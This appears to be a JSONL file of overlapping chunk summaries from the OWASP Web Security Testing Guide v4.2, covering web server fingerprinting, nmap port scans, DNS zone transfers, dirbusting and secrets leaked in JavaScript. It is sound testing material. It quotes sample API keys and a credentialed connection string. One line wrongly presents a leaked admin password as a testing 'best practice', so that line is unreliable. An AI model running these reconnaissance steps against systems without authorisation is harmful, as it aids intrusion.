Shodan can be sourced from the Google Hacking Diggity Project by Bishop Fox.\nSensitivity of design and configuration information should be carefully considered before posting online.\nRegularly review the sensitivity of existing online design and configuration information.\nWeb server fingerprinting identifies the type and version of a web server.\nIt helps security testers evaluate if applications are vulnerable to known exploits from older server versions."}
{"id": "WSTGv4_2-00022", "source": "wstg-v4.2_knowledge.json", "start_item": 373, "end_item": 391, "text": "tivity of existing online design and configuration information.\nWeb server fingerprinting identifies the type and version of a web server.\nIt helps security testers evaluate if applications are vulnerable to known exploits from older server versions.\nKey objectives include determining the web server version to discover vulnerabilities.\nTechniques for web server fingerprinting include banner grabbing and responding to malformed requests.\nAutomated tools may perform robust scans that combine multiple tactics for fingerprinting.\nA banner grab sends an HTTP request to the web server and examines the response header.\nSample response headers from Apache and nginx demonstrate how servers identify themselves.\nThe response from a lighttpd server can reveal key information in headers, such as server type and version.\nSecurity-conscious applications may modify headers to obscure their server information.\nThe ordering of HTTP headers can indicate the type of server: for example, Apache has a specific order while nginx and others may have different orders.\nTesters can use the ordering of header fields to make educated guesses about obscured server types.\nWeb servers can often be identified through their error responses and default error pages, which can be observed by sending malformed requests.\nExample of a 400 Bad Request response from Apache server along with HTTP headers and body content.\nExample of a 404 Not Found response from nginx along with its HTML structure.\nExample of a 400 Bad Request response from lighttpd with HTTP headers and body content.\nDiscussion on the value of default error pages in fingerprinting web servers despite obscured server headers.\nWeb server fingerprinting is a feature of automated scanning tools that helps in server identification by analyzing server responses.\nAutomated scanning tools can perform server-specific probes and compare responses faster than manual testing, leading to more accurate results.\nCommonly used automated scanning tools for web server fingerprinting include:\n- Netcraft: An online tool for scanning websites and gathering server information.\n- Nikto: An open-source command-line scanning tool."}
{"id": "WSTGv4_2-00023", "source": "wstg-v4.2_knowledge.json", "start_item": 392, "end_item": 409, "text": "ng, leading to more accurate results.\nCommonly used automated scanning tools for web server fingerprinting include:\n- Netcraft: An online tool for scanning websites and gathering server information.\n- Nikto: An open-source command-line scanning tool.\n- Nmap: An open-source command-line tool with a GUI version called Zenmap.\nExposed server information, while not a vulnerability itself, can aid attackers in exploiting other vulnerabilities or version-specific weaknesses.\nRecommendations to mitigate risks associated with exposed server information include:\n- Obscuring server information in HTTP headers using configurations such as Apache's mod_headers module.\n- Using a hardened reverse proxy server to add a security layer between the web server and the internet.\n- Keeping web servers updated with the latest software and security patches.\nTesting metadata files for information leakage is essential for identifying hidden web application paths and functionalities.\nThe test objectives include extracting and mapping information to better understand the systems and potential attack surfaces.\nTesting can be conducted using tools such as wget or curl, as well as DAST tools like ZAP and Burp Suite.\nAdvanced search techniques, such as Google Dorks and the inurl: feature, can help identify resources.\nRobots, spiders, and crawlers follow the Robots Exclusion Protocol stated in the robots.txt file of a web server.\nThe robots.txt file uses directives like User-agent to specify behavior for web spiders, and Disallow to restrict access to certain resources.\nWeb spiders/robots/crawlers can intentionally ignore 'Disallow' directives in a robots.txt file.\nThe robots.txt file is retrieved from the web root directory of the web server.\nTo retrieve the robots.txt file from a website using curl:\n```code $ curl -O -Ss http://www.google.com/robots.txt && head -n5 robots.txt ```\nWebsite owners can use Google Webmaster Tools for analyzing robots.txt files, which includes signing in and following specific instructions on the dashboard.\nMETA tags in the HEAD section of HTML documents should be consistent across a website and can specify directives for crawlers."}
{"id": "WSTGv4_2-00024", "source": "wstg-v4.2_knowledge.json", "start_item": 410, "end_item": 425, "text": "aster Tools for analyzing robots.txt files, which includes signing in and following specific instructions on the dashboard.\nMETA tags in the HEAD section of HTML documents should be consistent across a website and can specify directives for crawlers.\nThe robots exclusion protocol defaults to 'INDEX,FOLLOW' if there is no specific <META NAME='ROBOTS'> entry.\nTwo valid entries are 'NOINDEX' and 'NOFOLLOW' preffixed with 'NO...'.\nA regular expression search for <META NAME='ROBOTS'> is undertaken based on the robots.txt directives.\nOrganizations may embed informational META tags in web content to support technologies such as screen readers and search engine indexing.\nExample META tags from www.whitehouse.gov include 'og:title', 'og:description', etc.\nThe page includes code snippets demonstrating how to implement meta tags for Twitter sharing.\nSitemaps are files that provide information about a website’s structure for search engines and testers.\nA sample command for retrieving Google's primary sitemap is provided using the wget command.\nExample of an XML formatted sitemap is included, which lists URLs like Gmail and Forms.\nThe page discusses the importance and purpose of security.txt files for defining security policies and contact details for testing scenarios.\nThe security.txt file is located either in the root of the web server or in the .well-known/ directory, with examples provided for both:\n`https://example.com/security.txt` and `https://example.com/.well-known/security.txt` are valid paths for the security.txt file.\nA real-world example from LinkedIn shows how to retrieve the security.txt file using wget, providing a command and the expected output.\nThe contents of LinkedIn's security.txt include references to contact information, encryption, and policy links related to security.\nhumans.txt is a file that shares information about the people behind a website, often including career or job paths, with an example provided from Google.\n`wget` command used to retrieve the humans.txt file from Google, demonstrating how to capture and view its contents."}
{"id": "WSTGv4_2-00025", "source": "wstg-v4.2_knowledge.json", "start_item": 426, "end_item": 440, "text": "that shares information about the people behind a website, often including career or job paths, with an example provided from Google.\n`wget` command used to retrieve the humans.txt file from Google, demonstrating how to capture and view its contents.\nOther information files within the .well-known/ directory are suggested by various RFCs and Internet drafts, which can provide standardized uses for these files.\nTools for testing include Browser Inspect Tools, curl, wget, Burp Suite, and ZAP.\nWeb application vulnerability testing requires identifying applications hosted on a web server.\nMany applications may have known vulnerabilities, especially if they're not properly updated or configured.\nThe 1:1 relationship between an IP address and a web server is diminishing due to virtual servers hosting multiple applications.\nTesters may be given a set of IP addresses to assess, but could miss applications if the web server does not report them correctly when accessed directly by IP.\nIt is crucial to perform web application discovery to identify all accessible applications on a given infrastructure.\nTest objectives include enumerating applications that exist on a web server, with a goal of comprehensive testing.\nVarious techniques like using DNS, reverse-IP web searches, and search engines are employed to find web applications.\nThree factors influence the number of applications related to a DNS name or IP address: Different Base URL, Non-standard Ports, Virtual Hosts.\nBase URL: Web applications can exist under different URLs, and the same name can reference multiple applications.\nCode example illustrates multiple URLs associated with the same domain: http://www.example.com/url1, http://www.example.com/url2, http://www.example.com/url3.\nNon-standard Ports: Web applications may be associated with arbitrary TCP ports, not just the standard ones (80 for HTTP and 443 for HTTPS). Code example: http://www.example.com:20000/\nVirtual Hosts: A single IP address can have multiple symbolic names, allowing different web applications to be served from the same IP.\nThe Host header in HTTP 1.1 specifies the virtual host being referred to, which might not be obvious to users."}
{"id": "WSTGv4_2-00026", "source": "wstg-v4.2_knowledge.json", "start_item": 441, "end_item": 459, "text": "00/\nVirtual Hosts: A single IP address can have multiple symbolic names, allowing different web applications to be served from the same IP.\nThe Host header in HTTP 1.1 specifies the virtual host being referred to, which might not be obvious to users.\nApproaches to discover non-standard URLs include checking for directory browsing, searching with the 'site' operator in search engines, and probing likely URL candidates using intelligent guessing.\nPotential URL candidates for web applications include common terms such as 'webmail' or administrative interfaces.\nPort scanning is essential for service recognition on non-standard ports using tools like nmap.\nThe command to scan all TCP ports is: `nmap –Pn –sT –sV –p0-65535 192.168.1.100`.\nReviewing the scan output aids in identifying open services and their versions.\nExamples of discovered services include:\n- Open SSH on port 22 with version OpenSSH 3.5p1\n- Apache HTTP server on port 80 with version Apache httpd 2.0.40\n- SSL service on port 443 confirmed via browser or probing\n- Samba SWAT web interface on port 901\n- Nessus daemon on port 1241, which is SSL-wrapped but not HTTPS\nNmap can identify unknown services, which may be further explored with tools like telnet.\nExample to confirm an HTTP server on port 8000 using telnet: `$ telnet 192.168.1.100 8000` leads to `HTTP/1.0 200 OK` response.\nApache Tomcat running on port 8080.\nNessus can identify HTTP[S] services on non-standard ports and tests for web server vulnerabilities and SSL configurations.\nMethods to identify DNS names associated with an IP address include DNS Zone Transfers and inverse (PTR) DNS queries.\nDNS Zone Transfers have limited utility as many DNS servers do not honor them but can be attempted using tools like nslookup, host, or dig.\nExample of using a command to identify name servers for a domain: `$ host -t ns www.owasp.org` returns name servers ns1.secure.net and ns2.secure.net.\nTesting for zone transfer from a name server can result in obtaining a list of DNS entries such as www.example.com, helpdesk.example.com, and webmail.example.com."}
{"id": "WSTGv4_2-00027", "source": "wstg-v4.2_knowledge.json", "start_item": 460, "end_item": 478, "text": "n: `$ host -t ns www.owasp.org` returns name servers ns1.secure.net and ns2.secure.net.\nTesting for zone transfer from a name server can result in obtaining a list of DNS entries such as www.example.com, helpdesk.example.com, and webmail.example.com.\nExample of zone transfer request command: `$ host -l www.owasp.org ns1.secure.net` shows an error indicating transfer failure.\nDNS Inverse Queries leverage PTR records to retrieve symbolic names from IP addresses.\nThe page discusses various web security testing techniques related to DNS and Reverse-IP services.\nNetcraft Search DNS can be used to query for a list of names belonging to a specified domain.\nReverse-IP services enable testers to perform queries against web applications to obtain domain information associated with a specific IP address.\nUsing multiple Reverse-IP services is recommended for more comprehensive results, due to their differing and often partial results.\nExamples of Reverse-IP service queries include:\n- Domain Tools Reverse IP (requires free membership)\n- Bing, with query syntax: `ip:x.x.x.x`\n- Webhosting Info, with syntax: `http://whois.webhosting.info/x.x.x.x`\n- DNSstuff, which offers various services related to DNS queries.\nThe page provides an example showing a query result for IP address `216.48.3.18`, revealing additional symbolic names for the domain.\nSearch engines can be utilized for further analysis to find non-obvious URLs or additional symbolic names related to the target.\nCommon DNS lookup tools mentioned include `nslookup`, `dig`, and major search engines like Google and Bing.\nImage: img_page66_1.jpeg\nDetailed comments and metadata in HTML code might reveal internal information that should not be exposed.\nJavaScript variables can contain sensitive information like private API keys, internal IP addresses, and credentials which can be leaked if not handled properly.\nSource maps can make debug files available in production, increasing the risk of vulnerabilities being exploited by attackers.\nA review of webpage comments, metadata, and JavaScript code is critical to identify any potential information leakage."}
{"id": "WSTGv4_2-00028", "source": "wstg-v4.2_knowledge.json", "start_item": 479, "end_item": 509, "text": "rly.\nSource maps can make debug files available in production, increasing the risk of vulnerabilities being exploited by attackers.\nA review of webpage comments, metadata, and JavaScript code is critical to identify any potential information leakage.\nTesting objectives include checking for HTML comments and JavaScript code to uncover sensitive information.\nWeb Security Testing Guide v4.2 provides a table format to list users, for example:\n| 1 | Mary |\n| 2 | Peter |\n| 3 | Joe |\nA SQL query example to select active users:\n```code\n<!-- Query: SELECT id, name FROM app.users WHERE active='1' -->\n```\nBest practices for testing include using the database administrator's password for testing purposes: \"f@keP@a$$w0rD\"\nHTML version information is important; for example, the doctype declaration:\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\nDifferent DTDs are referenced:\n- strict.dtd – default strict DTD\n- loose.dtd – loose DTD\n- frameset.dtd – DTD for frameset documents\nMETA tags can provide information for profiling an application:\n<META name=\"Author\" content=\"Andrew Muller\">\nThe Refresh META tag example in HTML:\n<META http-equiv=\"Refresh\" content=\"15;URL=https://www.owasp.org/index.html\">\nCommon use of the META tag for search engine optimization:\n<META name=\"keywords\" lang=\"en-us\" content=\"OWASP, security, sunshine, lollipops\">\nManaging search engine indexing via META tags:\n<META name=\"robots\" content=\"none\">\nThe Platform for Internet Content Selection (PICS) and Protocol for Web Description Resources (POWDER) provide infrastructure for metadata.\nIdentifying sensitive information in JavaScript is key; check for variables in <script> tags.\nCheck JavaScript code for sensitive information leaks such as API keys, internal IP addresses, sensitive routes, or credentials.\nExample of sensitive credential leaks in JavaScript:\n```code const myS3Credentials = { accessKeyId: config( 'AWSS3AccessKeyID' ), secretAcccessKey: config( 'AWSS3SecretAccessKey' ), }; ```\nPotential risky code example that exposes connection strings:\n```code var conString = \"tcp://postgres:1234@localhost/postgres\"; ```"}
{"id": "WSTGv4_2-00029", "source": "wstg-v4.2_knowledge.json", "start_item": 510, "end_item": 537, "text": "3Credentials = { accessKeyId: config( 'AWSS3AccessKeyID' ), secretAcccessKey: config( 'AWSS3SecretAccessKey' ), }; ```\nPotential risky code example that exposes connection strings:\n```code var conString = \"tcp://postgres:1234@localhost/postgres\"; ```\nWhen an API Key is discovered, check for restrictions on its use such as IP or HTTP referrer settings to prevent misuse.\nExample of a script containing sensitive API keys:\n```code < script type= \"application/json\" > { \"GOOGLE_MAP_API_KEY\" : \"AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4\" , \"RECAPTCHA_KEY\" : \"6LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0\" } </ script > ```\nJavaScript can also reveal sensitive routes like links to hidden admin pages:\n```code < script type= \"application/json\" > \"runtimeConfig\" :{ \"BASE_URL_VOUCHER_API\" : \"https://staging-voucher.victim.net/api\" , \"BASE_BACKOFFICE_API\" : \"https://10.10.10.2/api\" , \"ADMIN_PAGE\" : \"/hidden_administrator\" } </ script > ```\nIdentifying Source Map Files: Source map files are accessed by using the '.map' extension after JS file extensions, which can lead to sensitive information about the application.\nExample of a source map structure that reveals application paths and file names:\n```code { \"version\": 3 , \"file\": \"static/js/main.chunk.js\" , \"sources\": [ \"/home/sysadmin/cashsystem/src/actions/index.js\" , \"/home/sysadmin/cashsystem/src/actions/reportAction.js\" ] } ```\nSource map files make front-end source code readable and easier to debug when websites load them.\nList of tools for web security testing includes:\n- Wget\n- Browser 'view source' function\n- Eyeballs\n- Curl\n- Burp Suite\n- Waybackurls\n- Google Maps API Scanner\nReferences for further reading include:\n- KeyHacks\n- Whitepapers\n- HTML version 4.01\n- XHTML\n- HTML version 5.\nCode snippet showing file paths in a specific JavaScript application setup.\nEnumerating application and attack surfaces is crucial before testing.\nTest objectives include identifying possible entry and injection points through request and response analysis.\nA good understanding of application communication is essential for testing.\nPay attention to all HTTP requests, parameters, and form fields during application exploration."}
{"id": "WSTGv4_2-00030", "source": "wstg-v4.2_knowledge.json", "start_item": 538, "end_item": 554, "text": "ing possible entry and injection points through request and response analysis.\nA good understanding of application communication is essential for testing.\nPay attention to all HTTP requests, parameters, and form fields during application exploration.\nUsing an intercepting proxy tool is recommended to monitor requests and responses.\nHidden form fields may contain sensitive information and should be noted carefully.\nA spreadsheet should be used to document interesting parameters, request types, authentication status, and other relevant notes.\nRequests and responses should be analyzed, focusing on GET and POST methods, as well as other HTTP methods like PUT and DELETE.\nIdentify parameters in POST requests, focusing on hidden parameters.\nUnderstanding that all form fields are sent in the body of the HTTP message.\nIdentify parameters in GET requests, especially those in the query string after the ? mark.\nRecognize that query string parameters are typically in key-value pair format.\nNote potential multiple parameters in one string, separated by various characters.\nHighlight the importance of identifying all parameters, especially for executing attacks.\nCheck for new cookies in the Set-Cookie header during responses and note any redirects or status codes.\nIdentify interesting headers, such as those indicating load balancing.\nProvide examples of GET and POST requests, detailing parameters involved in each request.\nTesting for application entry points using gray-box methodology involves identifying external data sources and working with developers to understand expected user inputs and how they are formatted.\nThe OWASP Attack Surface Detector (ASD) tool analyzes source code to identify web application endpoints, parameters, and their data types, including unlinked and optional parameters.\nASD can be run both as a plugin for ZAP and Burp Suite as well as a command-line tool, which can output the attack surface detection results in JSON format.\nExample command for using ASD includes: `java -jar attack-surface-detector-cli-1.3.5.jar <source-code-path> [flags]`"}
{"id": "WSTGv4_2-00031", "source": "wstg-v4.2_knowledge.json", "start_item": 555, "end_item": 570, "text": "a plugin for ZAP and Burp Suite as well as a command-line tool, which can output the attack surface detection results in JSON format.\nExample command for using ASD includes: `java -jar attack-surface-detector-cli-1.3.5.jar <source-code-path> [flags]`\nThe output of the tool provides a list of detected endpoints along with parameters and relevant file locations, which is essential for penetration testing.\nThe page appears to contain content related to web security testing, particularly focusing on endpoint detection and parameter generation for a Ruby on Rails application.\nThe code snippet outlines the parameters and data types for various API endpoints, highlighting their validation results.\nIt mentions generating distinct endpoints and parameters, along with an indication of their validation status, which is crucial for ensuring secure API functionalities.\nDetails about logging and the command-line flags for generating JSON output files suggest practical insights for users executing security tests.\nReferences to tools like OWASP ZAP and Burp Suite indicate the application of these practices in common security testing frameworks.\nUnderstanding the structure of the application is crucial for thorough security testing.\nTest objectives include mapping the target application and understanding principal workflows.\nVarious methods exist for testing and measuring code coverage, including combinatorial testing and data flow analysis.\nDocumenting discovered code paths is essential during black-box testing.\nSimpler testing approaches can involve direct communication with the application owner regarding specific concerns.\nA spreadsheet can be used to document discovered links and significant code paths during testing.\nGray-box and white-box testing approaches generally allow for better code coverage than black-box testing.\nDynamic Application Security Testing (DAST) tools help track web application coverage specifics more effectively.\nAn automatic spider is a tool that discovers new resources on websites and starts with a list of initial URLs (seeds).\nZed Attack Proxy (ZAP) is a tool for web security testing."}
{"id": "WSTGv4_2-00032", "source": "wstg-v4.2_knowledge.json", "start_item": 571, "end_item": 590, "text": "T) tools help track web application coverage specifics more effectively.\nAn automatic spider is a tool that discovers new resources on websites and starts with a list of initial URLs (seeds).\nZed Attack Proxy (ZAP) is a tool for web security testing.\nZAP has various automatic spidering options including Spider, AJAX Spider, and OpenAPI Support.\nZAP can be customized based on the tester's needs.\nImage: img_page77_1.png\nFingerprinting is essential in identifying web application frameworks and components during security tests.\nCommon web applications like WordPress, phpBB, and Mediawiki often have recognizable signatures and structures that aid in fingerprinting.\nTesting should include checking HTTP headers, cookies, HTML source code, specific files/folders, file extensions, and error messages.\nThe 'X-Powered-By' header in HTTP responses is a basic method for identifying the web framework being used.\nTools like netcat can be employed for making simple requests to retrieve HTTP headers.\nExample command for testing: `$ nc 127.0.0.1 80 HEAD / HTTP/1.0`\nAn example HTTP response can indicate the framework in use, as shown with `X-Powered-By: Mono` mentioned in the example.\nWhile this methodology can provide quick results, it is not foolproof and can be disabled by web server configuration.\nHTTP headers can reveal specific framework and version information, which can be useful for penetration testers.\nExample HTTP headers shown include 'X-Powered-By' and 'X-Generator' that may leak information about the underlying web technologies.\nDifferent versions of the 'Server' header are illustrated with responses from nginx server.\nFramework-specific cookies, like 'CAKEPHP', can provide reliable indications of the web framework being used, though they can be customized and changed.\nA typical HTTP response example shows various headers and their potential information leakage.\nCareful inspection of every HTTP header is crucial when performing the fingerprinting process.\nImage: img_page79_1.png\nCode snippet for configuring session cookie in CakePHP:\n```code | */ | | --- | | Configure::write( 'Session.cookie' , | 'CAKEPHP' ); | ```"}
{"id": "WSTGv4_2-00033", "source": "wstg-v4.2_knowledge.json", "start_item": 591, "end_item": 598, "text": " inspection of every HTTP header is crucial when performing the fingerprinting process.\nImage: img_page79_1.png\nCode snippet for configuring session cookie in CakePHP:\n```code | */ | | --- | | Configure::write( 'Session.cookie' , | 'CAKEPHP' ); | ```\nExplanation of identifying specific components from HTML source code, looking for markers like comments, paths, and script variables.\nCode snippet discussing the common markers in HTML for identifying frameworks:\n```code This technique is based on ﬁnding certain patterns in the HTML page source code. Often one can ﬁnd a lot of information which helps a tester to recognize a speciﬁc component. One of the common markers are HTML comments that directly lead to framework disclosure. More often certain framework-speciﬁc paths can be found, i.e. links to framework-speciﬁc CSS or JS folders. Finally, speciﬁc script variables might also point to a certain framework. ```\nMention of analyzing entire HTTP responses for additional useful information like comments and hidden fields.\nDiscussion on specific files and folders legacy in server structure aiding identification of applications/components.\nCode snippet about 'forced browsing' or 'dirbusting' technique for uncovering hidden files or folders:\n```code In order to uncover them a technique known as forced browsing or “dirbusting” is used. Dirbusting is brute forcing a target with known folder and ﬁlenames and monitoring HTTP-responses to enumerate server content. This information can be used both for ﬁnding default ﬁles and attacking them, and for ﬁngerprinting the web application. Dirbusting can be done in several ways, the example below shows a successful dirbusting attack against a WordPress-powered target with the help of deﬁned list and intruder functionality of Burp Suite. ```\nObservation about HTTP responses from WordPress-specific directories during a dirbusting attack:"}
{"id": "WSTGv4_2-00034", "source": "wstg-v4.2_knowledge.json", "start_item": 599, "end_item": 621, "text": " below shows a successful dirbusting attack against a WordPress-powered target with the help of deﬁned list and intruder functionality of Burp Suite. ```\nObservation about HTTP responses from WordPress-specific directories during a dirbusting attack:\n```code | We can see that for some WordPress-speciﬁc folders (for instance, | /wp-includes/ | , | /wp-admin/ | and | /wp-content/ | ) | | --- | --- | --- | --- | --- | --- | --- | | HTTP responses are 403 (Forbidden), 302 (Found, redirection to | wp-login.php | ), and 200 (OK) respectively. This is a | ```\nImage: img_page80_1.png\nImage: img_page80_2.png\nImage: img_page80_3.png\nThe text discusses a method of identifying WordPress powered targets using specific indicators.\nIt mentions the technique of dirbusting to discover application plugin folders and their versions.\nA CHANGELOG file from a Drupal plugin is highlighted as a source for identifying vulnerable plugin versions.\nThe importance of checking the robots.txt file before starting dirbusting is emphasized, as it may contain sensitive information about application-specific folders.\nAn example screenshot is referenced but not provided in the text.\nImage: img_page81_1.png\nThe page discusses techniques for identifying specific files and folders during web security testing, mentioning that they vary by application.\nIt suggests setting up a temporary installation of Open Source applications during penetration tests for better understanding of their infrastructure.\nFuzzDB wordlists are recommended for predictable files and folders.\nFile extensions in URLs can help identify the underlying web platform or technology used, with common extensions including .php for PHP, .aspx for Microsoft ASP.NET, and .jsp for Java Server Pages.\nError messages can reveal insights about the web application in use; for instance, a file system path pointing to 'wp-content' indicates the use of WordPress, which is PHP-based.\nImage: img_page82_1.png\nFigure 4.1.8-7 illustrates a WordPress Parse Error.\nList of common cookie identifiers used by various web frameworks and CMS systems:\nZope: zope3\nCakePHP: cakephp\nKohana: kohanasession\nLaravel: laravel_session\nphpBB: phpbb3_"}
{"id": "WSTGv4_2-00035", "source": "wstg-v4.2_knowledge.json", "start_item": 622, "end_item": 655, "text": ".\nImage: img_page82_1.png\nFigure 4.1.8-7 illustrates a WordPress Parse Error.\nList of common cookie identifiers used by various web frameworks and CMS systems:\nZope: zope3\nCakePHP: cakephp\nKohana: kohanasession\nLaravel: laravel_session\nphpBB: phpbb3_\nWordPress: wp-settings\n1C-Bitrix: BITRIX_\nAMPcms: AMP\nDjango CMS: django\nDotNetNuke: DotNetNukeAnonymous\ne107: e107_tz\nEPiServer: EPiTrace, EPiServer\nGrafﬁti CMS: grafﬁtibot\nHotaru CMS: hotaru_mobile\nImpressCMS: ICMSession\nIndico: MAKACSESSION\nInstantCMS: InstantCMS[logdate]\nKentico CMS: CMSPreferredCulture\nMODx: SN4[12symb]\nTYPO3: fe_typo_user\nDynamicweb: Dynamicweb\nLEPTON: lep[some_numeric_value]+sessionid\nWix: Domain=.wix.com\nVIVVO: VivvoSessionId\nImage: img_page83_1.png\nHTML source code indicators for popular applications like WordPress, phpBB, Mediawiki, Joomla, Drupal, and DotNetNuke.\nGeneral markers that can be found in web applications, such as %framework_name%, powered by, built upon, and running.\nSpecific markers for frameworks such as Adobe ColdFusion's headerTags, Microsoft ASP.NET's __VIEWSTATE, and ZK's comment markers.\nDiscusses the futility of security through obscurity and emphasizes the importance of stakeholder awareness and solution maintenance.\nIntroduces WhatWeb as a powerful fingerprinting tool, included in Kali Linux, and describes its matching capabilities using text strings, regular expressions, Google Hack Database queries, MD5 hashes, and URL recognition.\nProvides a URL to the WhatWeb tool's GitHub page.\nCustom Ruby code is used for passive and aggressive operations in web security testing.\nWappalyzer provides a means to identify technologies used on a website through browser extensions that work via regular expression matching.\nWappalyzer outputs results as icons based on technologies detected, though it may produce false positives.\nSample outputs from tools like WhatWeb and Wappalyzer are illustrated in referenced screenshots.\nCited references include works by Saumil Shah and Anant Shrivastava on HTTP fingerprinting and web application fingerprinting.\nImage: img_page85_1.png\nImage: img_page85_2.png\nImportance of configuration management in web security"}
{"id": "WSTGv4_2-00036", "source": "wstg-v4.2_knowledge.json", "start_item": 656, "end_item": 674, "text": "erenced screenshots.\nCited references include works by Saumil Shah and Anant Shrivastava on HTTP fingerprinting and web application fingerprinting.\nImage: img_page85_1.png\nImage: img_page85_2.png\nImportance of configuration management in web security\nA single vulnerability can compromise the entire web infrastructure\nNeed for in-depth review of configuration and security issues\nMapping network and application architecture is essential\nDifferent components of application architecture must be determined for security analysis\nSimple vs complex setups in mapping application architecture\nMethods of detecting network elements like firewalls and reverse proxies\nQuestions to ask during blind penetration testing to reveal architecture components\nPrevention Systems (IPS) block known attacks targeted at web servers.\nReverse proxies and application firewalls can modify error responses to indicate an active filtering system.\nDetection of reverse proxies can be performed by examining the server header and timing responses for cached requests.\nNetwork load balancers are detected by analyzing multiple requests and observing response patterns and headers for unique identifiers like BIGipServer cookies.\nApplication web servers can be identified by unique response headers and cookie usage, such as JSESSIONID from J2EE servers.\nBack-end authentication systems like LDAP or databases are not easily detectable solely from external requests; they require navigation of the application to reveal dynamic content indicators.\nThe presence of a back-end database may be inferred from the generation of dynamic content and specific identifier usage within the application.\nImage: img_page88_1.jpeg\nConfiguration and Deployment Management Testing focuses on the security aspects of network infrastructure and application platforms.\nTesting should include various areas such as handling of sensitive information through file extensions and backup files.\nImportant tests include enumerating admin interfaces, testing HTTP methods, and ensuring proper configuration of HTTP Strict Transport Security.\nTests for RIA Cross Domain Policy and file permissions are critical for maintaining security."}
{"id": "WSTGv4_2-00037", "source": "wstg-v4.2_knowledge.json", "start_item": 675, "end_item": 692, "text": "ckup files.\nImportant tests include enumerating admin interfaces, testing HTTP methods, and ensuring proper configuration of HTTP Strict Transport Security.\nTests for RIA Cross Domain Policy and file permissions are critical for maintaining security.\nSubdomain takeover and testing of cloud storage configurations are essential components of security assessments.\nImportance of configuration management in web server infrastructure to maintain security.\nA single vulnerability in interconnected applications can compromise entire infrastructure.\nStep-by-step process to test configuration management: identify infrastructure elements, review for known vulnerabilities, assess administrative tools, examine authentication systems, maintain control over required ports.\nReview and validate application configurations across the network for vulnerabilities.\nEnsure frameworks and systems in use are secure against known vulnerabilities and default settings.\nReviewing server vulnerabilities can be challenging during blind penetration tests, requiring automated tools.\nTesting for certain vulnerabilities may cause service downtime, especially for denial of service attacks.\nAutomated tools may produce false positives/negatives based on web server version detection.\nObscured or removed web server versions may not report vulnerabilities affecting them.\nSome vendors do not disclose vulnerabilities publicly, affecting vulnerability scanning tool efficacy.\nVulnerability scanning tools excel in common products but may lack coverage for lesser-known ones.\nInternal information of software (versions, releases, patches) enhances vulnerability assessment accuracy.\nVendors may silently fix vulnerabilities in new releases without announcements.\nOld, unsupported software versions present security risks without patches or advisories.\nAdministrative tools are essential for maintaining web server infrastructure, varying by technology used.\nApplications may have administrative interfaces to manage user data and content.\nIt is important to review administrative interfaces to prevent attackers from compromising the application."}
{"id": "WSTGv4_2-00038", "source": "wstg-v4.2_knowledge.json", "start_item": 693, "end_item": 706, "text": "aining web server infrastructure, varying by technology used.\nApplications may have administrative interfaces to manage user data and content.\nIt is important to review administrative interfaces to prevent attackers from compromising the application.\nAccess mechanisms to administrative interfaces should be determined and any vulnerabilities assessed.\nDefault usernames and passwords should be changed for security.\nExternal parties may manage some aspects of web applications, increasing risk if administrative interfaces are available online.\nTesting administrative interfaces is crucial for identifying potential vulnerabilities.\nTest Application Platform Configuration aims to prevent mistakes that compromise security in application architecture.\nConfiguration review and testing are critical for maintaining a secure architecture due to generic default configurations often present.\nDefaults and known files need to be removed prior to deployment to avoid exploitation.\nTesting objectives include validating that no debugging code or extensions remain in production and reviewing logging mechanisms.\nBlack-Box Testing is a method employed to identify sample and known files and directories that may pose vulnerabilities.\nExamples of vulnerabilities: CVE-1999-0449 (IIS Denial of Service), CAN-2002-1744 (directory traversal in IIS), CAN-2002-1630 (sendmail.jsp in Oracle 9iAS), CAN-2003-1172 (Apache Cocoon directory traversal).\nCGI scanners can assist in identifying known vulnerable files but a full review of server contents is needed for thorough testing.\nComment reviews can reveal sensitive information inadvertently left in HTML code from developer comments, necessitating careful inspection of both static and dynamic content.\nVarious tools can be used for assessing target systems' conformance to configuration baselines: CIS-CAT Lite, Microsoft's Attack Surface Analyzer, NIST's National Checklist Program, Gray-Box Testing, Configuration Review.\nWeb server/application server configuration is crucial for protecting site contents and should be carefully reviewed for common mistakes."}
{"id": "WSTGv4_2-00039", "source": "wstg-v4.2_knowledge.json", "start_item": 707, "end_item": 719, "text": " Microsoft's Attack Surface Analyzer, NIST's National Checklist Program, Gray-Box Testing, Configuration Review.\nWeb server/application server configuration is crucial for protecting site contents and should be carefully reviewed for common mistakes.\nRecommended configurations vary by site policy and functionality, but generally, vendor or external guidelines should be followed.\nCommon guidelines include: Enable only necessary server modules to reduce attack surface; Handle server errors with custom pages to avoid revealing sensitive information; Run server software with minimized privileges to prevent system compromise; Properly log legitimate accesses and errors; Configure the server to handle overloads and prevent DoS attacks.\nNever grant non-administrative identities access to applicationHost.config, redirection.config, and administration.config, and refrain from sharing these files on the network.\nSensitive information should not be stored in publicly readable .NET Framework machine.config and root web.config files; it should be encrypted instead.\nDo not grant Write access to the identity used by the Web server for shared applicationHost.config; only Read access should be allowed.\nUse a separate identity for publishing applicationHost.config to shared configurations.\nMaintain strong password security for shared configuration encryption keys and restrict access to the share containing these configurations.\nWeb sites can be vulnerable to malicious sources that could gain control of servers by exploiting IIS worker processes.\nFirewall rules and IPsec policies can protect shares by restricting access to only member web servers.\nLogging is critical for detecting application flaws and sustained attacks, but applications often fail to log properly beyond debugging purposes.\nKey log analysis points include assessing the presence of sensitive information, dedicated log servers, and log rotation practices.\nSensitive information in logs (like usernames and passwords) poses a security risk if logs are accessed by attackers.\nEvent logs may contain useful data for attackers, including debug information, usernames, internal IPs, and less sensitive personal information."}
{"id": "WSTGv4_2-00040", "source": "wstg-v4.2_knowledge.json", "start_item": 720, "end_item": 737, "text": "formation in logs (like usernames and passwords) poses a security risk if logs are accessed by attackers.\nEvent logs may contain useful data for attackers, including debug information, usernames, internal IPs, and less sensitive personal information.\nCompliance with data protection laws regarding sensitive information in log files is crucial to avoid penalties.\nEncryption keys and sensitive data such as bank account details should be handled with care.\nLogs should be stored separately from the web server to prevent loss from intruders.\nAttackers can use ''log zappers'' to remove evidence of their activities, so maintaining secure log storage is crucial.\nLog storage should be configured to prevent Denial of Service conditions due to excessive log growth.\nIn UNIX systems, logs are typically stored in the /var directory; it is important to use a separate partition for logging.\nLogs must be monitored to prevent filling up disk space and potentially harming system functionality.\nLog rotation is necessary to manage log file size and retention according to security policies, ensuring logs are compressed and permissions are correctly set.\nLog files should have permissions set to prevent web server process 